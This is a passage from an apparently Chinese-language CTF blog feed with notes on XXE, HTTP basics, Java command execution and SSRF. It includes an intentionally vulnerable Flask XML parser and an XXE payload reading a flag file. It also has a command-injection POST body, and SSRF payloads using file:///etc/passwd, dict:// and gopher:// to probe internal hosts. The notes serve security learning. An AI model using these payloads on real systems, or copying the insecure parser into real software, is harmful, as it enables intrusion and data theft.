class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/parse&#x27;</span>,methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>():<br>    xml=request.form.get(<span class="hljs-string">&#x27;xml&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(xml)<br>    <span class="hljs-keyword">if</span> xml <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;None&quot;</span><br>    parser = etree.XMLParser(load_dtd=<span class="hljs-literal">True</span>, resolve_entities=<span class="hljs-literal">True</span>)<br>    root = etree.fromstring(xml, parser)<br>    name=root.find(<span class="hljs-string">&#x27;name&#x27;</span>).text<br>    <span class="hljs-keyword">return</span> name <span class="hljs-keyword">or</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8000</span>)<br></code></pre></td></tr></table></figure><p>先写一个html进行交互</p><figure class="highlight html"><figcaption><span>file:localhost.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XML 解析器<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>XML 解析器<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://47.76.151.192:60088/parse&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;xml&quot;</span>&gt;</span>输入 XML 数据：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;50&quot;</span> <span class="hljs-attr">required</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span> ]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Redis</title>
    <link href="/2025/03/22/Redis/"/>
    <url>/2025/03/22/Redis/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP</title>
    <link href="/2025/03/22/HTTP/"/>
    <url>/2025/03/22/HTTP/</url>
    
    <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>HTTPS&#x3D;HTTP+SSL<br>HTTP端口80，HTTPS端口443</p><h3 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h3><p>当你传入 <code>?basectf=we1c%00me</code> 但实际变成了 <code>we1cme</code>，这是因为 <code>%00</code> 是 URL 编码中代表空字节（<code>NULL</code> 字符）的转义序列。许多 Web 服务器和编程语言在处理 URL 时会将 <code>%00</code> 识别为字符串结束符，从而忽略 <code>%00</code> 后面的内容。这在 Web 安全中称为“空字节截断”，通常用于绕过某些安全检查。</p><p>解决方法：</p><p><strong>双重编码</strong>：</p><ul><li>使用双重编码将 <code>%00</code> 编码成 <code>%2500</code>，使服务器不会直接识别它为空字节，但在服务器端你需要解码两次才能得到原始值。</li></ul><h3 id="常见状态码"><a href="#常见状态码" class="headerlink" title="常见状态码"></a>常见状态码</h3><ul><li>200 OK &#x2F;&#x2F;客户端请求成功</li><li>400 Bad Request &#x2F;&#x2F;客户端请求有语法错误，不能被服务器所理解 </li><li>401 Unauthorized &#x2F;&#x2F;请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用 </li><li>403 Forbidden &#x2F;&#x2F;服务器收到请求，但是拒绝提供服务 </li><li>404 Not Found &#x2F;&#x2F;请求资源不存在，eg：输入了错误的URL </li><li>500 Internal Server Error &#x2F;&#x2F;服务器发生不可预期的错误 </li><li>503 Server Unavailable &#x2F;&#x2F;服务器当前不能处理客户端的请求，一段时间后可能恢复正常</li></ul><h3 id="请求头总结"><a href="#请求头总结" class="headerlink" title="请求头总结"></a>请求头总结</h3><p>http date标头使用案例:  Tue, 20 Aug 2024 00:00:00 GMT</p><ul><li>X-Forwarded-For：包含客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用逗号分隔。</li><li>X-Real-IP：包含客户端 IP 地址，与 X-Forwarded-For 的区别在于它只包含一个 IP 地址，而不是包含一系列 IP 地址列表。</li><li>Remote-Addr：包含客户端 IP 地址，但可能被代理服务器篡改。</li><li>Client-IP：包含客户端 IP 地址，但可能被代理服务器篡改。</li><li>Via：包含了 HTTP 请求经过的代理服务器的地址和版本信息，多个代理服务器之间用逗号分隔。</li><li>Forwarded：RFC 7239 规定的标准头部，包含了客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用分号分隔。</li><li>Forwarded-For：与 X-Forwarded-For 类似，用于标识客户端 IP 地址和可能的代理服务器 IP 地址，多个 IP 地址之间用逗号分隔。</li><li>X-Originating-IP：用于标识客户端 IP 地址，但可能被代理服务器篡改。</li><li>X-Cluster-Client-IP：用于标识客户端 IP 地址，但可能被代理服务器篡改。</li><li>True-Client-IP：用于标识客户端 IP 地址，但可能被代理服务器篡改</li></ul><h3 id="发包GET改POST"><a href="#发包GET改POST" class="headerlink" title="发包GET改POST"></a>发包GET改POST</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">一、开头改请求方式<br>POST /?id=1 HTTP/1.1<br>把GET改成POST，GET和POST混合请求的统一用POST<br><br>二、中间添加一行参数<br>Content-Type: application/x-www-form-urlencoded<br>实际应用中，不写这句话会导致POST请求无效。<br><br>三、末尾空一行写POST参数<br>cmd=system(&#x27;cat /flllllaaaaaaggggggg&#x27;)<br></code></pre></td></tr></table></figure><h3 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h3><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>状态码</td><td>状态码英文名称</td><td>中文描述</td></tr><tr><td>100</td><td>Continue</td><td>继续。客户端应继续其请求</td></tr><tr><td>101</td><td>Switching Protocols</td><td>切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td></td><td></td><td></td></tr><tr><td>200</td><td>OK</td><td>请求成功。一般用于GET与POST请求</td></tr><tr><td>201</td><td>Created</td><td>已创建。成功请求并创建了新的资源</td></tr><tr><td>202</td><td>Accepted</td><td>已接受。已经接受请求，但未处理完成</td></tr><tr><td>203</td><td>Non-Authoritative Information</td><td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td>204</td><td>No Content</td><td>无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td>205</td><td>Reset Content</td><td>重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td>206</td><td>Partial Content</td><td>部分内容。服务器成功处理了部分GET请求</td></tr><tr><td></td><td></td><td></td></tr><tr><td>300</td><td>Multiple Choices</td><td>多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td>302</td><td>Found</td><td>临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td>303</td><td>See Other</td><td>查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td>304</td><td>Not Modified</td><td>未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td>305</td><td>Use Proxy</td><td>使用代理。所请求的资源必须通过代理访问</td></tr><tr><td>306</td><td>Unused</td><td>已经被废弃的HTTP状态码</td></tr><tr><td>307</td><td>Temporary Redirect</td><td>临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td></td><td></td><td></td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求的语法错误，服务器无法理解</td></tr><tr><td>401</td><td>Unauthorized</td><td>请求要求用户的身份认证</td></tr><tr><td>402</td><td>Payment Required</td><td>保留，将来使用</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td>404</td><td>Not Found</td><td>服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td>405</td><td>Method Not Allowed</td><td>客户端请求中的方法被禁止</td></tr><tr><td>406</td><td>Not Acceptable</td><td>服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td>407</td><td>Proxy Authentication Required</td><td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td>408</td><td>Request Time-out</td><td>服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td>409</td><td>Conflict</td><td>服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td>410</td><td>Gone</td><td>客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td>411</td><td>Length Required</td><td>服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td>412</td><td>Precondition Failed</td><td>客户端请求信息的先决条件错误</td></tr><tr><td>413</td><td>Request Entity Too Large</td><td>由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td>414</td><td>Request-URI Too Large</td><td>请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td>415</td><td>Unsupported Media Type</td><td>服务器无法处理请求附带的媒体格式</td></tr><tr><td>416</td><td>Requested range not satisfiable</td><td>客户端请求的范围无效</td></tr><tr><td>417</td><td>Expectation Failed</td><td>服务器无法满足Expect的请求头信息</td></tr><tr><td></td><td></td><td></td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误，无法完成请求</td></tr><tr><td>501</td><td>Not Implemented</td><td>服务器不支持请求的功能，无法完成请求</td></tr><tr><td>502</td><td>Bad Gateway</td><td>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td>503</td><td>Service Unavailable</td><td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td>504</td><td>Gateway Time-out</td><td>充当网关或代理的服务器，未及时从远端服务器获取请求</td></tr><tr><td>505</td><td>HTTP Version not supported</td><td>服务器不支持请求的HTTP协议的版本，无法完成处理</td></tr></tbody></table><h3 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h3><p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取&#x2F;查询资源信息，而POST一般用于更新资源信息.</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>序号</td><td>方法</td><td>描述</td></tr><tr><td>1</td><td>GET</td><td>请求指定的页面信息，并返回实体主体。</td></tr><tr><td>2</td><td>HEAD</td><td>类似于 GET 请求，只不过返回的响应中没有具体的内容，用于获取报头</td></tr><tr><td>3</td><td>POST</td><td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。</td></tr><tr><td>4</td><td>PUT</td><td>从客户端向服务器传送的数据取代指定的文档的内容。</td></tr><tr><td>5</td><td>DELETE</td><td>请求服务器删除指定的页面。</td></tr><tr><td>6</td><td>CONNECT</td><td>HTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。</td></tr><tr><td>7</td><td>OPTIONS</td><td>允许客户端查看服务器的性能。</td></tr><tr><td>8</td><td>TRACE</td><td>回显服务器收到的请求，主要用于测试或诊断。</td></tr><tr><td>9</td><td>PATCH</td><td>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</td></tr></tbody></table><h3 id="HTTP响应头"><a href="#HTTP响应头" class="headerlink" title="HTTP响应头"></a>HTTP响应头</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>应答头</td><td>说明</td></tr><tr><td>Allow</td><td>服务器支持哪些请求方法（如GET、POST等）。</td></tr><tr><td>Content-Encoding</td><td>文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(“Accept-Encoding”)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</td></tr><tr><td>Content-Length</td><td>表示内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</td></tr><tr><td>Content-Type</td><td>表示后面的文档属于什么MIME类型。Servlet默认为text&#x2F;plain，但通常需要显式地指定为text&#x2F;html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</td></tr><tr><td>Date</td><td>当前的GMT时间。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</td></tr><tr><td>Expires</td><td>应该在什么时候认为文档已经过期，从而不再缓存它？</td></tr><tr><td>Last-Modified</td><td>文档的最后改动时间。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</td></tr><tr><td>Location</td><td>表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</td></tr><tr><td>Refresh</td><td>表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(“Refresh”, “5; URL&#x3D;<a href="http://host/path%22)%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AF%BB%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9A%84%E9%A1%B5%E9%9D%A2%E3%80%82">http://host/path&quot;)让浏览器读取指定的页面。</a>  <br>注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV&#x3D;”Refresh” CONTENT&#x3D;”5;URL&#x3D;<a href="http://host/path%22%EF%BC%9E%E5%AE%9E%E7%8E%B0%EF%BC%8C%E8%BF%99%E6%98%AF%E5%9B%A0%E4%B8%BA%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%88%B7%E6%96%B0%E6%88%96%E9%87%8D%E5%AE%9A%E5%90%91%E5%AF%B9%E4%BA%8E%E9%82%A3%E4%BA%9B%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8CGI%E6%88%96Servlet%E7%9A%84HTML%E7%BC%96%E5%86%99%E8%80%85%E5%8D%81%E5%88%86%E9%87%8D%E8%A6%81%E3%80%82%E4%BD%86%E6%98%AF%EF%BC%8C%E5%AF%B9%E4%BA%8EServlet%E6%9D%A5%E8%AF%B4%EF%BC%8C%E7%9B%B4%E6%8E%A5%E8%AE%BE%E7%BD%AERefresh%E5%A4%B4%E6%9B%B4%E5%8A%A0%E6%96%B9%E4%BE%BF%E3%80%82">http://host/path&quot;＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。</a>  <br>  <br>注意Refresh的意义是”N秒之后刷新本页面或访问指定页面”，而不是”每隔N秒刷新本页面或访问指定页面”。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV&#x3D;”Refresh” …＞。  <br>  <br>注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</td></tr><tr><td>Server</td><td>服务器名字。Servlet一般不设置这个值，而是由Web服务器自己设置。</td></tr><tr><td>Set-Cookie</td><td>设置和页面关联的Cookie。Servlet不应使用response.setHeader(“Set-Cookie”, …)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</td></tr><tr><td>WWW-Authenticate</td><td>客户应该在Authorization头中提供什么类型的授权信息？在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(“WWW-Authenticate”, “BASIC realm&#x3D;＼”executives＼””)。  <br>注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）。</td></tr></tbody></table><h2 id="HTTP请求走私"><a href="#HTTP请求走私" class="headerlink" title="HTTP请求走私"></a>HTTP请求走私</h2>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA命令执行</title>
    <link href="/2025/03/22/JAVA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2025/03/22/JAVA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<figure class="highlight java"><figcaption><span>file:RCE.java</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeTest</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String args [])</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">if</span> (args.length==<span class="hljs-number">0</span>) &#123;<br>            System.exit(<span class="hljs-number">1</span>);  <span class="hljs-comment">//没有参数就退出</span><br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">command</span> <span class="hljs-operator">=</span> args[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">run</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">pro</span> <span class="hljs-operator">=</span> run. exec(command);  <span class="hljs-comment">//执行命令</span><br>        <span class="hljs-type">InputStreamReader</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(pro.getInputStream());<br>        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(in);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">String</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> buff.readLine();temp!=<span class="hljs-literal">null</span>;temp=buff.readLine())&#123;<br>            System.out.println(temp);  <span class="hljs-comment">//输出结果</span><br>        &#125;<br>        buff .close();<br>        in.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">javac -encoding UTF-8 RuntimeTest.java<br>java RuntimeTest <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2025/03/22/SSRF/"/>
    <url>/2025/03/22/SSRF/</url>
    
    <content type="html"><![CDATA[<h2 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h2><p>在 <a href="http://xxx.github.io@localhost/">http://xxx.github.io@localhost</a> 这种URL中，@符号前的部分（<code>xxx.github.io</code>）是用来提供用户信息的（通常是用户名和密码），实际请求会发送到@符号后面的部分（即<code>localhost</code>）。这是因为根据URL的标准格式，@符号前的内容被解释为“用户信息”，而不是实际的主机名。</p><p>这种方式可以被利用来绕过一些基于主机名的安全检查。比如，如果某个系统检查URL中是否包含某个域名，如github.io，并认为只要包含这个域名就是安全的，但没有进一步解析和验证@符号之后的部分，这样的系统就可能被绕过。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。<br>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file://从文件系统中获取文件内容，如 file:///etc/passwd<br>dict://字典服务协议，访问字典资源，如 dict:///ip:6739/info:<br>ftp://可用于网络端口扫描<br>sftp://SSH文件传输协议或安全文件传输协议<br>ldap://轻量级目录访问协议<br>tftp://简单文件传输协议<br>gopher://分布式文档传递服务<br></code></pre></td></tr></table></figure><h5 id="file"><a href="#file" class="headerlink" title="file"></a>file</h5><p>查找内网存活主机IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file://filepath            从文件系统中获取文件内容<br>file:///etc/passwd         读取文件passwd<br>file:///etc/hosts          显示当前操作系统网卡的IP<br>file:///proc/net/arp       显示arp缓存表（寻找内网其他主机）<br>file:///proc/net/fib_trie  显示当前网段路由信息<br></code></pre></td></tr></table></figure><h5 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h5><p>字典服务协议，访问字典资源<br>查找内网主机开放端口<br>可用于:扫描端口、获取内网信息、爆破密码等<br><code>dict://172.251.250.1:6397/info</code></p><h5 id="http"><a href="#http" class="headerlink" title="http"></a>http</h5><p>目录扫描</p><h5 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h5><p>第一位字符作为填充位（也就是说不转发第一个字符）<br>基本格式：<code>url:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code><br>默认端口是70</p><p><code>gopher://172.250.250.4:80/_</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gopher">GET提交<br>gopher://172.250.250.4:80/_GET /name.php?name=test HTTP/1.1<br>Host: 172.250.250.4<br><br>POST提交需要保留头部信息:<br>POST<br>Host:<br>Content-Type:<br>Content-Length:<br><br>eg:<br>url=gopher://172.250.250.4:80/_POST /name.php HTTP/1.1<br>Host: 172.250.250.4<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 9<br><br>name=test<br></code></pre></td></tr></table></figure><p>注意事项：<br><code>?</code>需要URL编码<br>回车换行要变为%0d%0a，直接工具可能是%0a<br>HTTP包最后要加%0d%0a<br>burp发包需要url编码两次</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="环回地址绕过"><a href="#环回地址绕过" class="headerlink" title="环回地址绕过"></a>环回地址绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!/bin/bash</span><br>ip=<span 